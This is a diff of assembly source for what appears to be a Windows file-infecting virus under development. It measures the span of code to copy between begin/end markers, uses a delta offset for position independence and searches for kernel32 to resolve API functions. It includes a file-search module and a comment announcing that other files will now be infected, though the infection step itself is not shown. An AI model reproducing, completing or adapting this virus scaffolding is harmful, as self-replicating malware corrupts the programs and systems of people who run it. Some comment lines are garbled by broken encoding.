@@ -15,17 +15,26 @@ includelib \masm32\lib\user32.lib
 includelib \masm32\lib\msvcrt.lib
 
 include search_k32.asm
+
+.data?
+mycode_len dd ?
+.data
+
+msgFormat_2 db 'Number of bytes between begincopy and endcopy: %d', 0
+buffer_2 db 256 dup(0)
+end_copy dd  $
+
 .code
   
-begin_copy:
 
+ begin_copy:
 ; �������������������������������������������������������������������������
 ; DATA (inside .code section)
 ; �������������������������������������������������������������������������
-    mycode_len DWORD 0 
-buffer_mycode_len db 256 dup(0)
-format_l db "File size: %d", 0
-     msgCaption db "Hello", 0
+    
+    buffer_mycode_len db 256 dup(0)
+    format_l db "File size: %d", 0
+    msgCaption db "Hello", 0
     msgOfVictory        db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0
     msgText db "Hello, World!", 0
     kernel32_dll_name db "kernel32.dll", 0
@@ -81,7 +90,7 @@ format_l db "File size: %d", 0
 
 
   include utils.asm
- include search_files.asm   
+  include search_files.asm   
   
   
 ; �������������������������������������������������������������������������
@@ -95,12 +104,27 @@ format_l db "File size: %d", 0
 ; esi: Parsing pointer. Keeps track of where we need to be in the PE.
 ; �������������������������������������������������������������������������
 
-start:                                     ; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY ***
-; functions loading end.
+start:   
+; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY ***
 
+    ; Calcular el número de bytes entre begincopy y endcopy
+    push eax
+    push ecx
+    lea eax, end_copy
+    lea ecx,begin_copy
+    sub eax, ecx
+    mov mycode_len, eax
+   
+    ; Formatear el mensaje con wsprintf
+    invoke wsprintf, addr buffer_2, addr msgFormat_2, mycode_len
 
+    ; Mostrar el resultado en un MessageBox
+    invoke MessageBoxA, NULL, addr buffer_2, addr msgCaption, MB_OK
+    pop ecx
+    pop eax
+     
     mov  esi, [esp]                        ; Look for last eip which was in kernel32.dll, and is now on the stack because of the call from there.
-
+    
 main PROC NEAR
 
     LOCAL getProcAddress_addr:DWORD
@@ -112,33 +136,23 @@ main PROC NEAR
     LOCAL filesize:DWORD;local from main
      LOCAL win32finddata:WIN32_FIND_DATA
     LOCAL buffer[256]: BYTE   ; Buffer for formatted string
-   format BYTE 'File size: %d bytes', 0 ; Format string for displaying file size; Format string for displaying file size
+    format BYTE 'File size: %d bytes', 0 ; Format string for displaying file size; Format string for displaying file size
    
-
-
-
-;before function addresses
-
+    ;before function addresses
+    invoke MessageBox, NULL, addr msgCaption, addr msgCaption, MB_OK 
     call delta_offset                      ; Get delta offset for position independence.
-delta_offset:
-    pop  ebx
-    sub  ebx, delta_offset                 ; now ebx == delta offset. Add it to any address which is inside this program to be position independent.
-    
+    delta_offset:
+     pop  ebx
+     sub  ebx, delta_offset                 ; now ebx == delta offset. Add it to any address which is inside this program to be position independent.
+     SEARCH_K32                            ; Llamar a la macro SEARCH_K32
+     invoke LoadLibrary, addr kernel32_dll_name
+     ; Verificar si se cargó correctamente la DLL
+     test eax, eax
+     jz f ; Si eax es cero (falla), saltar al final
+     ;invoke LoadLibrary, addr kernel32_dll_name
+     mov ebx, eax ; Guardar el handle de la DLL en ebx
  
- SEARCH_K32                            ; Llamar a la macro SEARCH_K32
-
-invoke LoadLibrary, addr kernel32_dll_name
-    
-    ; Verificar si se cargó correctamente la DLL
-    test eax, eax
-    jz f ; Si eax es cero (falla), saltar al final
-
-   ; Load your functions here.
-    
-    ;invoke LoadLibrary, addr kernel32_dll_name
-    mov ebx, eax ; Guardar el handle de la DLL en ebx
- 
-; Loads a function from a dll using GetProcAddress and LoadLibrary that we just got from kernel32.dll.
+ ; Loads a function from a dll using GetProcAddress and LoadLibrary that we just got from kernel32.dll.
 ; Can be used ONLY within main procedure.
 
 LOADFUNC MACRO fct_name, dll_name, result_container
@@ -319,12 +333,10 @@ ENDM
 ; functions loading end.
 
     next:
-     lea ecx,dword ptr [mycode_len]
-      mov dword ptr [ecx],6
-      sub dword ptr [ecx],2
-    invoke wsprintf, addr buffer_mycode_len, addr format_l, mycode_len
-    invoke MessageBoxA, NULL, addr buffer_mycode_len, addr msgCaption, MB_OK
-
+    ; lea ecx,dword ptr [mycode_len]
+     ; mov dword ptr [ecx],6
+     ; sub dword ptr [ecx],2
+ 
     invoke MessageBox, NULL, addr msgOfVictory, addr msgOfVictory, MB_OK
 ; --------------------------------------> Now, time to infect the other files ! Niark niark niark...
     ;mov ecx,win32finddata              ; Load address of win32finddata into ECX
@@ -365,6 +377,7 @@ exit:
     ret
 main ENDP
 
-end_copy:
+
     ret
 end start
+
